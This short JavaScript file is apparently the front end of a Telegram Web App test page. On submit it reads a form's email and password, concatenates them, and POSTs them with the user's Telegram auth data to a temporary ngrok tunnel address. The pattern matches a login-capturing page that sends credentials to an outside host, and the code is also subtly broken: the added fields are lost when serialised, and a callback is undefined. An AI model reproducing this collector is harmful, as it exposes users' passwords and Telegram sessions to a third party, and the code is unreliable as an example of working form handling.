"use strict";

const TestApp = function () {
	this.initData = Telegram.WebApp.initData || "";
	this.initDataUnsafe = Telegram.WebApp.initDataUnsafe || "";
	Telegram.WebApp.ready();
};

TestApp.prototype.sendData = function (method, text) {
	// Telegram.WebApp.showAlert("\n" + this.initDataUnsafe.query_id);
	// Telegram.WebApp.sendData(text);
	const authData = this.initData || "";
	fetch("https://efad-213-55-90-5.ngrok-free.app", {
		method: "POST",
		body: JSON.stringify(
			Object.assign(text, {
				_auth: authData,
				method: method,
			})
		),
		credentials: "include",
		headers: {
			"Content-Type": "application/json",
		},
	})
		.then(function (response) {
			console.log(response.json());
		})
		.catch(function (error) {
			onCallback && onCallback({ error: "Server error" });
		});
};

function setThemeClass() {
	document.documentElement.className = Telegram.WebApp.colorScheme;
}
Telegram.WebApp.onEvent("themeChanged", setThemeClass);
setThemeClass();

const submitBtn = document.getElementById("submit-btn");
submitBtn.addEventListener("click", (event) => {
	let email = document.getElementById("email").value;
	let pass = document.getElementById("pass").value;
	//Telegram.WebApp.showAlert(email + "\n" + pass);
	const testApp = new TestApp();
	testApp.sendData("sendMessage", email + pass);
});
